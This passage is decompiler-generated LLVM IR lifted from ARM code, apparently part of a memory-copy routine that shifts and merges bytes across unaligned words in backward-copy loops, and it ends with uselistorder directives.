  store i8 %v11_f110, i8* %v12_f114, align 1
  %v13_f114 = load i32, i32* %r0.global-to-local, align 4
  %v14_f114 = add i32 %v13_f114, -1
  store i32 %v14_f114, i32* %r0.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %bb155, %dec_label_pc_f0fc, %bb156
  %v0_f17020 = phi i32 [ %v12_f10c, %bb155 ], [ %v6_f104, %dec_label_pc_f0fc ], [ %v14_f114, %bb156 ]
  %v0_f118 = load i32, i32* %r2.global-to-local, align 4
  %v1_f118 = load i32, i32* @ip, align 4
  %v2_f118 = sub i32 %v0_f118, %v1_f118
  store i32 %v2_f118, i32* %r2.global-to-local, align 4
  %v4_f118 = xor i32 %v1_f118, %v0_f118
  %v5_f118 = xor i32 %v2_f118, %v0_f118
  %v6_f118 = and i32 %v5_f118, %v4_f118
  %v7_f118 = icmp slt i32 %v6_f118, 0
  store i1 %v7_f118, i1* %cpsr_v.global-to-local, align 1
  %v8_f118 = icmp slt i32 %v2_f118, 0
  store i1 %v8_f118, i1* %cpsr_n.global-to-local, align 1
  %v9_f118 = icmp eq i32 %v0_f118, %v1_f118
  store i1 %v9_f118, i1* %cpsr_z.global-to-local, align 1
  %v5_f11c = icmp slt i32 %v0_f118, %v1_f118
  br i1 %v5_f11c, label %bb151, label %dec_label_pc_f120

dec_label_pc_f120:                                ; preds = %.thread14
  %v0_f120 = load i32, i32* %r1.global-to-local, align 4
  %v1_f120 = urem i32 %v0_f120, 4
  store i32 %v1_f120, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_f120 = icmp eq i32 %v1_f120, 0
  store i1 %v2_f120, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f120, label %dec_label_pc_f064, label %dec_label_pc_f128

dec_label_pc_f128:                                ; preds = %dec_label_pc_f05c, %dec_label_pc_f120
  %v0_f17019 = phi i32 [ %v2_f048, %dec_label_pc_f05c ], [ %v0_f17020, %dec_label_pc_f120 ]
  %v0_f21c = phi i32 [ %v2_f04c, %dec_label_pc_f05c ], [ %v2_f118, %dec_label_pc_f120 ]
  %v0_f128 = phi i32 [ %v2_f044, %dec_label_pc_f05c ], [ %v0_f120, %dec_label_pc_f120 ]
  %v0_f130 = phi i32 [ %v1_f05c, %dec_label_pc_f05c ], [ %v1_f120, %dec_label_pc_f120 ]
  %v1_f128 = and i32 %v0_f128, -4
  store i32 %v1_f128, i32* %r1.global-to-local, align 4
  %v1_f12c = inttoptr i32 %v1_f128 to i32*
  %v2_f12c = load i32, i32* %v1_f12c, align 4
  store i32 %v2_f12c, i32* @r3, align 4
  %v7_f130 = icmp ult i32 %v0_f130, 2
  %v2_f214 = add i32 %v0_f21c, -12
  %v4_f214 = sub i32 11, %v0_f21c
  %v5_f214 = and i32 %v4_f214, %v0_f21c
  %v6_f214 = icmp slt i32 %v5_f214, 0
  store i1 %v6_f214, i1* %cpsr_v.global-to-local, align 1
  %v7_f214 = icmp slt i32 %v2_f214, 0
  store i1 %v7_f214, i1* %cpsr_n.global-to-local, align 1
  %v8_f214 = icmp eq i32 %v0_f21c, 12
  store i1 %v8_f214, i1* %cpsr_z.global-to-local, align 1
  %v5_f218 = icmp slt i32 %v0_f21c, 12
  br i1 %v7_f130, label %dec_label_pc_f214, label %dec_label_pc_f138

dec_label_pc_f138:                                ; preds = %dec_label_pc_f128
  %v8_f130 = icmp eq i32 %v0_f130, 2
  br i1 %v8_f130, label %dec_label_pc_f1a8, label %dec_label_pc_f13c

dec_label_pc_f13c:                                ; preds = %dec_label_pc_f138
  br i1 %v5_f218, label %dec_label_pc_f188, label %dec_label_pc_f144

dec_label_pc_f144:                                ; preds = %dec_label_pc_f13c
  store i32 %v2_f214, i32* %r2.global-to-local, align 4
  %v3_f148 = load i32, i32* @r4, align 4
  store i32 %v3_f148, i32* %stack_var_-12, align 4
  %v6_f148 = load i32, i32* @r5, align 4
  %v8_f148 = inttoptr i32 %v6_f148 to i8*
  store i8* %v8_f148, i8** %stack_var_-8, align 4
  %v11_f148 = load i32, i32* @lr, align 4
  br label %dec_label_pc_f14c

dec_label_pc_f14c:                                ; preds = %dec_label_pc_f14c.dec_label_pc_f14c_crit_edge, %dec_label_pc_f144
  %v0_f170 = phi i32 [ %v1_f170, %dec_label_pc_f14c.dec_label_pc_f14c_crit_edge ], [ %v0_f17019, %dec_label_pc_f144 ]
  %v0_f150 = phi i32 [ %v0_f150.pre, %dec_label_pc_f14c.dec_label_pc_f14c_crit_edge ], [ %v1_f128, %dec_label_pc_f144 ]
  %v0_f14c = phi i32 [ %v0_f14c.pre, %dec_label_pc_f14c.dec_label_pc_f14c_crit_edge ], [ %v2_f12c, %dec_label_pc_f144 ]
  %v3_f14c = mul i32 %v0_f14c, 256
  store i32 %v3_f14c, i32* %lr.global-to-local, align 4
  %v1_f150 = add i32 %v0_f150, -4
  %v2_f150 = inttoptr i32 %v1_f150 to i32*
  %v3_f150 = load i32, i32* %v2_f150, align 4
  store i32 %v3_f150, i32* @r3, align 4
  %v4_f150 = add i32 %v0_f150, -8
  %v5_f150 = inttoptr i32 %v4_f150 to i32*
  %v6_f150 = load i32, i32* %v5_f150, align 4
  store i32 %v6_f150, i32* %r4.global-to-local, align 4
  %v7_f150 = add i32 %v0_f150, -12
  %v8_f150 = inttoptr i32 %v7_f150 to i32*
  %v9_f150 = load i32, i32* %v8_f150, align 4
  store i32 %v9_f150, i32* %r5.global-to-local, align 4
  %v10_f150 = add i32 %v0_f150, -16
  %v11_f150 = inttoptr i32 %v10_f150 to i32*
  %v12_f150 = load i32, i32* %v11_f150, align 4
  store i32 %v10_f150, i32* %r1.global-to-local, align 4
  %v4_f154 = udiv i32 %v12_f150, 16777216
  %v5_f154 = or i32 %v4_f154, %v3_f14c
  store i32 %v5_f154, i32* %lr.global-to-local, align 4
  %v3_f158 = mul i32 %v12_f150, 256
  %v4_f15c = udiv i32 %v9_f150, 16777216
  %v5_f15c = or i32 %v3_f158, %v4_f15c
  store i32 %v5_f15c, i32* @ip, align 4
  %v3_f160 = mul i32 %v9_f150, 256
  %v4_f164 = udiv i32 %v6_f150, 16777216
  %v5_f164 = or i32 %v3_f160, %v4_f164
  store i32 %v5_f164, i32* %r5.global-to-local, align 4
  %v3_f168 = mul i32 %v6_f150, 256
  %v4_f16c = udiv i32 %v3_f150, 16777216
  %v5_f16c = or i32 %v3_f168, %v4_f16c
  store i32 %v5_f16c, i32* %r4.global-to-local, align 4
  %v1_f170 = add i32 %v0_f170, -16
  %v2_f170 = inttoptr i32 %v1_f170 to i32*
  store i32 %v5_f16c, i32* %v2_f170, align 4
  %v4_f170 = add i32 %v0_f170, -12
  %v5_f170 = inttoptr i32 %v4_f170 to i32*
  %v6_f170 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_f170, i32* %v5_f170, align 4
  %v7_f170 = add i32 %v0_f170, -8
  %v8_f170 = inttoptr i32 %v7_f170 to i32*
  %v9_f170 = load i32, i32* @ip, align 4
  store i32 %v9_f170, i32* %v8_f170, align 4
  %v10_f170 = add i32 %v0_f170, -4
  %v11_f170 = inttoptr i32 %v10_f170 to i32*
  %v12_f170 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_f170, i32* %v11_f170, align 4
  store i32 %v1_f170, i32* %r0.global-to-local, align 4
  %v0_f174 = load i32, i32* %r2.global-to-local, align 4
  %v2_f174 = add i32 %v0_f174, -16
  store i32 %v2_f174, i32* %r2.global-to-local, align 4
  %v6_f178 = icmp slt i32 %v0_f174, 16
  br i1 %v6_f178, label %dec_label_pc_f17c, label %dec_label_pc_f14c.dec_label_pc_f14c_crit_edge

dec_label_pc_f14c.dec_label_pc_f14c_crit_edge:    ; preds = %dec_label_pc_f14c
  %v0_f14c.pre = load i32, i32* @r3, align 4
  %v0_f150.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_f14c

dec_label_pc_f17c:                                ; preds = %dec_label_pc_f14c
  %v2_f17c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_f17c, i32* @r4, align 4
  %v5_f17c = load i8*, i8** %stack_var_-8, align 4
  %v6_f17c = ptrtoint i8* %v5_f17c to i32
  store i32 %v6_f17c, i32* @r5, align 4
  store i32 %v11_f148, i32* @lr, align 4
  %v2_f180 = add i32 %v0_f174, -4
  store i32 %v2_f180, i32* %r2.global-to-local, align 4
  %v4_f180 = add i32 %v0_f174, 2147483632
  %v5_f180 = and i32 %v2_f180, %v4_f180
  %v6_f180 = icmp slt i32 %v5_f180, 0
  store i1 %v6_f180, i1* %cpsr_v.global-to-local, align 1
  %v7_f180 = icmp slt i32 %v2_f180, 0
  store i1 %v7_f180, i1* %cpsr_n.global-to-local, align 1
  %v8_f180 = icmp eq i32 %v2_f180, 0
  store i1 %v8_f180, i1* %cpsr_z.global-to-local, align 1
  %v5_f184 = icmp slt i32 %v2_f174, -12
  br i1 %v5_f184, label %dec_label_pc_f1a0, label %dec_label_pc_f188

dec_label_pc_f188:                                ; preds = %dec_label_pc_f17c, %dec_label_pc_f13c, %dec_label_pc_f188
  %v1_f194 = phi i32 [ %v5_f194, %dec_label_pc_f188 ], [ %v1_f170, %dec_label_pc_f17c ], [ %v0_f17019, %dec_label_pc_f13c ]
  %v0_f188 = load i32, i32* @r3, align 4
  %v3_f188 = mul i32 %v0_f188, 256
  store i32 %v3_f188, i32* %ip.global-to-local, align 4
  %v0_f18c = load i32, i32* %r1.global-to-local, align 4
  %v1_f18c = add i32 %v0_f18c, -4
  %v2_f18c = inttoptr i32 %v1_f18c to i32*
  %v3_f18c = load i32, i32* %v2_f18c, align 4
  store i32 %v3_f18c, i32* @r3, align 4
  store i32 %v1_f18c, i32* %r1.global-to-local, align 4
  %v4_f190 = udiv i32 %v3_f18c, 16777216
  %v5_f190 = or i32 %v4_f190, %v3_f188
  store i32 %v5_f190, i32* @ip, align 4
  %v2_f194 = add i32 %v1_f194, -4
  %v3_f194 = inttoptr i32 %v2_f194 to i32*
  store i32 %v5_f190, i32* %v3_f194, align 4
  %v4_f194 = load i32, i32* %r0.global-to-local, align 4
  %v5_f194 = add i32 %v4_f194, -4
  store i32 %v5_f194, i32* %r0.global-to-local, align 4
  %v0_f198 = load i32, i32* %r2.global-to-local, align 4
  %v2_f198 = add i32 %v0_f198, -4
  store i32 %v2_f198, i32* %r2.global-to-local, align 4
  %v6_f19c = icmp slt i32 %v0_f198, 4
  br i1 %v6_f19c, label %dec_label_pc_f1a0.loopexit, label %dec_label_pc_f188

dec_label_pc_f1a0.loopexit:                       ; preds = %dec_label_pc_f188
  %v4_f198 = sub i32 3, %v0_f198
  %v5_f198 = and i32 %v4_f198, %v0_f198
  %v6_f198 = icmp slt i32 %v5_f198, 0
  %v7_f198 = icmp slt i32 %v2_f198, 0
  store i1 %v6_f198, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_f198, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f1a0

dec_label_pc_f1a0:                                ; preds = %dec_label_pc_f1a0.loopexit, %dec_label_pc_f17c
  %v2_f0e451 = phi i32 [ %v5_f194, %dec_label_pc_f1a0.loopexit ], [ %v1_f170, %dec_label_pc_f17c ]
  %v0_f0d447 = phi i32 [ %v2_f198, %dec_label_pc_f1a0.loopexit ], [ %v2_f180, %dec_label_pc_f17c ]
  %v0_f1a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_f1a0 = add i32 %v0_f1a0, 3
  store i32 %v1_f1a0, i32* %r1.global-to-local, align 4
  br label %bb151

dec_label_pc_f1a8:                                ; preds = %dec_label_pc_f138
  br i1 %v5_f218, label %dec_label_pc_f1f4, label %dec_label_pc_f1b0

dec_label_pc_f1b0:                                ; preds = %dec_label_pc_f1a8
  store i32 %v2_f214, i32* %r2.global-to-local, align 4
  %v3_f1b4 = load i32, i32* @r4, align 4
  store i32 %v3_f1b4, i32* %stack_var_-12, align 4
  %v6_f1b4 = load i32, i32* @r5, align 4
  %v8_f1b4 = inttoptr i32 %v6_f1b4 to i8*
  store i8* %v8_f1b4, i8** %stack_var_-8, align 4
  %v11_f1b4 = load i32, i32* @lr, align 4
  br label %dec_label_pc_f1b8

dec_label_pc_f1b8:                                ; preds = %dec_label_pc_f1b8.dec_label_pc_f1b8_crit_edge, %dec_label_pc_f1b0
  %v0_f1dc = phi i32 [ %v1_f1dc, %dec_label_pc_f1b8.dec_label_pc_f1b8_crit_edge ], [ %v0_f17019, %dec_label_pc_f1b0 ]
  %v0_f1bc = phi i32 [ %v0_f1bc.pre, %dec_label_pc_f1b8.dec_label_pc_f1b8_crit_edge ], [ %v1_f128, %dec_label_pc_f1b0 ]
  %v0_f1b8 = phi i32 [ %v0_f1b8.pre, %dec_label_pc_f1b8.dec_label_pc_f1b8_crit_edge ], [ %v2_f12c, %dec_label_pc_f1b0 ]
  %v3_f1b8 = mul i32 %v0_f1b8, 65536
  store i32 %v3_f1b8, i32* %lr.global-to-local, align 4
  %v1_f1bc = add i32 %v0_f1bc, -4
  %v2_f1bc = inttoptr i32 %v1_f1bc to i32*
  %v3_f1bc = load i32, i32* %v2_f1bc, align 4
  store i32 %v3_f1bc, i32* @r3, align 4
  %v4_f1bc = add i32 %v0_f1bc, -8
  %v5_f1bc = inttoptr i32 %v4_f1bc to i32*
  %v6_f1bc = load i32, i32* %v5_f1bc, align 4
  store i32 %v6_f1bc, i32* %r4.global-to-local, align 4
  %v7_f1bc = add i32 %v0_f1bc, -12
  %v8_f1bc = inttoptr i32 %v7_f1bc to i32*
  %v9_f1bc = load i32, i32* %v8_f1bc, align 4
  store i32 %v9_f1bc, i32* %r5.global-to-local, align 4
  %v10_f1bc = add i32 %v0_f1bc, -16
  %v11_f1bc = inttoptr i32 %v10_f1bc to i32*
  %v12_f1bc = load i32, i32* %v11_f1bc, align 4
  store i32 %v10_f1bc, i32* %r1.global-to-local, align 4
  %v4_f1c0 = udiv i32 %v12_f1bc, 65536
  %v5_f1c0 = or i32 %v4_f1c0, %v3_f1b8
  store i32 %v5_f1c0, i32* %lr.global-to-local, align 4
  %v3_f1c4 = mul i32 %v12_f1bc, 65536
  %v4_f1c8 = udiv i32 %v9_f1bc, 65536
  %v5_f1c8 = or i32 %v3_f1c4, %v4_f1c8
  store i32 %v5_f1c8, i32* @ip, align 4
  %v3_f1cc = mul i32 %v9_f1bc, 65536
  %v4_f1d0 = udiv i32 %v6_f1bc, 65536
  %v5_f1d0 = or i32 %v3_f1cc, %v4_f1d0
  store i32 %v5_f1d0, i32* %r5.global-to-local, align 4
  %v3_f1d4 = mul i32 %v6_f1bc, 65536
  %v4_f1d8 = udiv i32 %v3_f1bc, 65536
  %v5_f1d8 = or i32 %v3_f1d4, %v4_f1d8
  store i32 %v5_f1d8, i32* %r4.global-to-local, align 4
  %v1_f1dc = add i32 %v0_f1dc, -16
  %v2_f1dc = inttoptr i32 %v1_f1dc to i32*
  store i32 %v5_f1d8, i32* %v2_f1dc, align 4
  %v4_f1dc = add i32 %v0_f1dc, -12
  %v5_f1dc = inttoptr i32 %v4_f1dc to i32*
  %v6_f1dc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_f1dc, i32* %v5_f1dc, align 4
  %v7_f1dc = add i32 %v0_f1dc, -8
  %v8_f1dc = inttoptr i32 %v7_f1dc to i32*
  %v9_f1dc = load i32, i32* @ip, align 4
  store i32 %v9_f1dc, i32* %v8_f1dc, align 4
  %v10_f1dc = add i32 %v0_f1dc, -4
  %v11_f1dc = inttoptr i32 %v10_f1dc to i32*
  %v12_f1dc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_f1dc, i32* %v11_f1dc, align 4
  store i32 %v1_f1dc, i32* %r0.global-to-local, align 4
  %v0_f1e0 = load i32, i32* %r2.global-to-local, align 4
  %v2_f1e0 = add i32 %v0_f1e0, -16
  store i32 %v2_f1e0, i32* %r2.global-to-local, align 4
  %v6_f1e4 = icmp slt i32 %v0_f1e0, 16
  br i1 %v6_f1e4, label %dec_label_pc_f1e8, label %dec_label_pc_f1b8.dec_label_pc_f1b8_crit_edge

dec_label_pc_f1b8.dec_label_pc_f1b8_crit_edge:    ; preds = %dec_label_pc_f1b8
  %v0_f1b8.pre = load i32, i32* @r3, align 4
  %v0_f1bc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_f1b8

dec_label_pc_f1e8:                                ; preds = %dec_label_pc_f1b8
  %v2_f1e8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_f1e8, i32* @r4, align 4
  %v5_f1e8 = load i8*, i8** %stack_var_-8, align 4
  %v6_f1e8 = ptrtoint i8* %v5_f1e8 to i32
  store i32 %v6_f1e8, i32* @r5, align 4
  store i32 %v11_f1b4, i32* @lr, align 4
  %v2_f1ec = add i32 %v0_f1e0, -4
  store i32 %v2_f1ec, i32* %r2.global-to-local, align 4
  %v4_f1ec = add i32 %v0_f1e0, 2147483632
  %v5_f1ec = and i32 %v2_f1ec, %v4_f1ec
  %v6_f1ec = icmp slt i32 %v5_f1ec, 0
  store i1 %v6_f1ec, i1* %cpsr_v.global-to-local, align 1
  %v7_f1ec = icmp slt i32 %v2_f1ec, 0
  store i1 %v7_f1ec, i1* %cpsr_n.global-to-local, align 1
  %v8_f1ec = icmp eq i32 %v2_f1ec, 0
  store i1 %v8_f1ec, i1* %cpsr_z.global-to-local, align 1
  %v5_f1f0 = icmp slt i32 %v2_f1e0, -12
  br i1 %v5_f1f0, label %dec_label_pc_f20c, label %dec_label_pc_f1f4

dec_label_pc_f1f4:                                ; preds = %dec_label_pc_f1e8, %dec_label_pc_f1a8, %dec_label_pc_f1f4
  %v1_f200 = phi i32 [ %v5_f200, %dec_label_pc_f1f4 ], [ %v1_f1dc, %dec_label_pc_f1e8 ], [ %v0_f17019, %dec_label_pc_f1a8 ]
  %v0_f1f4 = load i32, i32* @r3, align 4
  %v3_f1f4 = mul i32 %v0_f1f4, 65536
  store i32 %v3_f1f4, i32* %ip.global-to-local, align 4
  %v0_f1f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_f1f8 = add i32 %v0_f1f8, -4
  %v2_f1f8 = inttoptr i32 %v1_f1f8 to i32*
  %v3_f1f8 = load i32, i32* %v2_f1f8, align 4
  store i32 %v3_f1f8, i32* @r3, align 4
  store i32 %v1_f1f8, i32* %r1.global-to-local, align 4
  %v4_f1fc = udiv i32 %v3_f1f8, 65536
  %v5_f1fc = or i32 %v4_f1fc, %v3_f1f4
  store i32 %v5_f1fc, i32* @ip, align 4
  %v2_f200 = add i32 %v1_f200, -4
  %v3_f200 = inttoptr i32 %v2_f200 to i32*
  store i32 %v5_f1fc, i32* %v3_f200, align 4
  %v4_f200 = load i32, i32* %r0.global-to-local, align 4
  %v5_f200 = add i32 %v4_f200, -4
  store i32 %v5_f200, i32* %r0.global-to-local, align 4
  %v0_f204 = load i32, i32* %r2.global-to-local, align 4
  %v2_f204 = add i32 %v0_f204, -4
  store i32 %v2_f204, i32* %r2.global-to-local, align 4
  %v6_f208 = icmp slt i32 %v0_f204, 4
  br i1 %v6_f208, label %dec_label_pc_f20c.loopexit, label %dec_label_pc_f1f4

dec_label_pc_f20c.loopexit:                       ; preds = %dec_label_pc_f1f4
  %v4_f204 = sub i32 3, %v0_f204
  %v5_f204 = and i32 %v4_f204, %v0_f204
  %v6_f204 = icmp slt i32 %v5_f204, 0
  %v7_f204 = icmp slt i32 %v2_f204, 0
  store i1 %v6_f204, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_f204, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f20c

dec_label_pc_f20c:                                ; preds = %dec_label_pc_f20c.loopexit, %dec_label_pc_f1e8
  %v2_f0e452 = phi i32 [ %v5_f200, %dec_label_pc_f20c.loopexit ], [ %v1_f1dc, %dec_label_pc_f1e8 ]
  %v0_f0d448 = phi i32 [ %v2_f204, %dec_label_pc_f20c.loopexit ], [ %v2_f1ec, %dec_label_pc_f1e8 ]
  %v0_f20c = load i32, i32* %r1.global-to-local, align 4
  %v1_f20c = add i32 %v0_f20c, 2
  store i32 %v1_f20c, i32* %r1.global-to-local, align 4
  br label %bb151

dec_label_pc_f214:                                ; preds = %dec_label_pc_f128
  br i1 %v5_f218, label %dec_label_pc_f260, label %dec_label_pc_f21c

dec_label_pc_f21c:                                ; preds = %dec_label_pc_f214
  store i32 %v2_f214, i32* %r2.global-to-local, align 4
  %v3_f220 = load i32, i32* @r4, align 4
  store i32 %v3_f220, i32* %stack_var_-12, align 4
  %v6_f220 = load i32, i32* @r5, align 4
  %v8_f220 = inttoptr i32 %v6_f220 to i8*
  store i8* %v8_f220, i8** %stack_var_-8, align 4
  %v11_f220 = load i32, i32* @lr, align 4
  br label %dec_label_pc_f224

dec_label_pc_f224:                                ; preds = %dec_label_pc_f224.dec_label_pc_f224_crit_edge, %dec_label_pc_f21c
  %v0_f248 = phi i32 [ %v1_f248, %dec_label_pc_f224.dec_label_pc_f224_crit_edge ], [ %v0_f17019, %dec_label_pc_f21c ]
  %v0_f228 = phi i32 [ %v0_f228.pre, %dec_label_pc_f224.dec_label_pc_f224_crit_edge ], [ %v1_f128, %dec_label_pc_f21c ]
  %v0_f224 = phi i32 [ %v0_f224.pre, %dec_label_pc_f224.dec_label_pc_f224_crit_edge ], [ %v2_f12c, %dec_label_pc_f21c ]
  %v3_f224 = mul i32 %v0_f224, 16777216
  store i32 %v3_f224, i32* %lr.global-to-local, align 4
  %v1_f228 = add i32 %v0_f228, -4
  %v2_f228 = inttoptr i32 %v1_f228 to i32*
  %v3_f228 = load i32, i32* %v2_f228, align 4
  store i32 %v3_f228, i32* @r3, align 4
  %v4_f228 = add i32 %v0_f228, -8
  %v5_f228 = inttoptr i32 %v4_f228 to i32*
  %v6_f228 = load i32, i32* %v5_f228, align 4
  store i32 %v6_f228, i32* %r4.global-to-local, align 4
  %v7_f228 = add i32 %v0_f228, -12
  %v8_f228 = inttoptr i32 %v7_f228 to i32*
  %v9_f228 = load i32, i32* %v8_f228, align 4
  store i32 %v9_f228, i32* %r5.global-to-local, align 4
  %v10_f228 = add i32 %v0_f228, -16
  %v11_f228 = inttoptr i32 %v10_f228 to i32*
  %v12_f228 = load i32, i32* %v11_f228, align 4
  store i32 %v10_f228, i32* %r1.global-to-local, align 4
  %v4_f22c = udiv i32 %v12_f228, 256
  %v5_f22c = or i32 %v4_f22c, %v3_f224
  store i32 %v5_f22c, i32* %lr.global-to-local, align 4
  %v3_f230 = mul i32 %v12_f228, 16777216
  %v4_f234 = udiv i32 %v9_f228, 256
  %v5_f234 = or i32 %v3_f230, %v4_f234
  store i32 %v5_f234, i32* @ip, align 4
  %v3_f238 = mul i32 %v9_f228, 16777216
  %v4_f23c = udiv i32 %v6_f228, 256
  %v5_f23c = or i32 %v3_f238, %v4_f23c
  store i32 %v5_f23c, i32* %r5.global-to-local, align 4
  %v3_f240 = mul i32 %v6_f228, 16777216
  %v4_f244 = udiv i32 %v3_f228, 256
  %v5_f244 = or i32 %v3_f240, %v4_f244
  store i32 %v5_f244, i32* %r4.global-to-local, align 4
  %v1_f248 = add i32 %v0_f248, -16
  %v2_f248 = inttoptr i32 %v1_f248 to i32*
  store i32 %v5_f244, i32* %v2_f248, align 4
  %v4_f248 = add i32 %v0_f248, -12
  %v5_f248 = inttoptr i32 %v4_f248 to i32*
  %v6_f248 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_f248, i32* %v5_f248, align 4
  %v7_f248 = add i32 %v0_f248, -8
  %v8_f248 = inttoptr i32 %v7_f248 to i32*
  %v9_f248 = load i32, i32* @ip, align 4
  store i32 %v9_f248, i32* %v8_f248, align 4
  %v10_f248 = add i32 %v0_f248, -4
  %v11_f248 = inttoptr i32 %v10_f248 to i32*
  %v12_f248 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_f248, i32* %v11_f248, align 4
  store i32 %v1_f248, i32* %r0.global-to-local, align 4
  %v0_f24c = load i32, i32* %r2.global-to-local, align 4
  %v2_f24c = add i32 %v0_f24c, -16
  store i32 %v2_f24c, i32* %r2.global-to-local, align 4
  %v6_f250 = icmp slt i32 %v0_f24c, 16
  br i1 %v6_f250, label %dec_label_pc_f254, label %dec_label_pc_f224.dec_label_pc_f224_crit_edge

dec_label_pc_f224.dec_label_pc_f224_crit_edge:    ; preds = %dec_label_pc_f224
  %v0_f224.pre = load i32, i32* @r3, align 4
  %v0_f228.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_f224

dec_label_pc_f254:                                ; preds = %dec_label_pc_f224
  %v2_f254 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_f254, i32* @r4, align 4
  %v5_f254 = load i8*, i8** %stack_var_-8, align 4
  %v6_f254 = ptrtoint i8* %v5_f254 to i32
  store i32 %v6_f254, i32* @r5, align 4
  store i32 %v11_f220, i32* @lr, align 4
  %v2_f258 = add i32 %v0_f24c, -4
  store i32 %v2_f258, i32* %r2.global-to-local, align 4
  %v4_f258 = add i32 %v0_f24c, 2147483632
  %v5_f258 = and i32 %v2_f258, %v4_f258
  %v6_f258 = icmp slt i32 %v5_f258, 0
  store i1 %v6_f258, i1* %cpsr_v.global-to-local, align 1
  %v7_f258 = icmp slt i32 %v2_f258, 0
  store i1 %v7_f258, i1* %cpsr_n.global-to-local, align 1
  %v8_f258 = icmp eq i32 %v2_f258, 0
  store i1 %v8_f258, i1* %cpsr_z.global-to-local, align 1
  %v5_f25c = icmp slt i32 %v2_f24c, -12
  br i1 %v5_f25c, label %dec_label_pc_f278, label %dec_label_pc_f260

dec_label_pc_f260:                                ; preds = %dec_label_pc_f254, %dec_label_pc_f214, %dec_label_pc_f260
  %v1_f26c = phi i32 [ %v5_f26c, %dec_label_pc_f260 ], [ %v1_f248, %dec_label_pc_f254 ], [ %v0_f17019, %dec_label_pc_f214 ]
  %v0_f260 = load i32, i32* @r3, align 4
  %v3_f260 = mul i32 %v0_f260, 16777216
  store i32 %v3_f260, i32* %ip.global-to-local, align 4
  %v0_f264 = load i32, i32* %r1.global-to-local, align 4
  %v1_f264 = add i32 %v0_f264, -4
  %v2_f264 = inttoptr i32 %v1_f264 to i32*
  %v3_f264 = load i32, i32* %v2_f264, align 4
  store i32 %v3_f264, i32* @r3, align 4
  store i32 %v1_f264, i32* %r1.global-to-local, align 4
  %v4_f268 = udiv i32 %v3_f264, 256
  %v5_f268 = or i32 %v4_f268, %v3_f260
  store i32 %v5_f268, i32* @ip, align 4
  %v2_f26c = add i32 %v1_f26c, -4
  %v3_f26c = inttoptr i32 %v2_f26c to i32*
  store i32 %v5_f268, i32* %v3_f26c, align 4
  %v4_f26c = load i32, i32* %r0.global-to-local, align 4
  %v5_f26c = add i32 %v4_f26c, -4
  store i32 %v5_f26c, i32* %r0.global-to-local, align 4
  %v0_f270 = load i32, i32* %r2.global-to-local, align 4
  %v2_f270 = add i32 %v0_f270, -4
  store i32 %v2_f270, i32* %r2.global-to-local, align 4
  %v6_f274 = icmp slt i32 %v0_f270, 4
  br i1 %v6_f274, label %dec_label_pc_f278.loopexit, label %dec_label_pc_f260

dec_label_pc_f278.loopexit:                       ; preds = %dec_label_pc_f260
  %v4_f270 = sub i32 3, %v0_f270
  %v5_f270 = and i32 %v4_f270, %v0_f270
  %v6_f270 = icmp slt i32 %v5_f270, 0
  %v7_f270 = icmp slt i32 %v2_f270, 0
  store i1 %v6_f270, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_f270, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f278

dec_label_pc_f278:                                ; preds = %dec_label_pc_f278.loopexit, %dec_label_pc_f254
  %v2_f0e453 = phi i32 [ %v5_f26c, %dec_label_pc_f278.loopexit ], [ %v1_f248, %dec_label_pc_f254 ]
  %v0_f0d449 = phi i32 [ %v2_f270, %dec_label_pc_f278.loopexit ], [ %v2_f258, %dec_label_pc_f254 ]
  %v0_f278 = load i32, i32* %r1.global-to-local, align 4
  %v1_f278 = add i32 %v0_f278, 1
  store i32 %v1_f278, i32* %r1.global-to-local, align 4
  br label %bb151

; uselistorder directives
  uselistorder i32 %v5_f26c, { 0, 2, 1 }
  uselistorder i32 %v3_f260, { 1, 0 }
  uselistorder i32 %v2_f258, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_f248, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_f228, { 1, 0 }
  uselistorder i32 %v3_f224, { 1, 0 }
  uselistorder i32 %v0_f228, { 3, 2, 1, 0 }
  uselistorder i32 %v0_f248, { 3, 2, 1, 0 }
  uselistorder i32 %v5_f200, { 0, 2, 1 }
  uselistorder i32 %v3_f1f4, { 1, 0 }
  uselistorder i32 %v2_f1ec, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_f1dc, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_f1bc, { 1, 0 }
  uselistorder i32 %v3_f1b8, { 1, 0 }
  uselistorder i32 %v0_f1bc, { 3, 2, 1, 0 }
  uselistorder i32 %v0_f1dc, { 3, 2, 1, 0 }
  uselistorder i32 %v5_f194, { 0, 2, 1 }
  uselistorder i32 %v3_f188, { 1, 0 }
  uselistorder i32 %v2_f180, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_f170, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_f150, { 1, 0 }
  uselistorder i32 %v3_f14c, { 1, 0 }
  uselistorder i32 %v0_f150, { 3, 2, 1, 0 }
  uselistorder i32 %v0_f170, { 3, 2, 1, 0 }
  uselistorder i1 %v5_f218, { 2, 0, 1 }
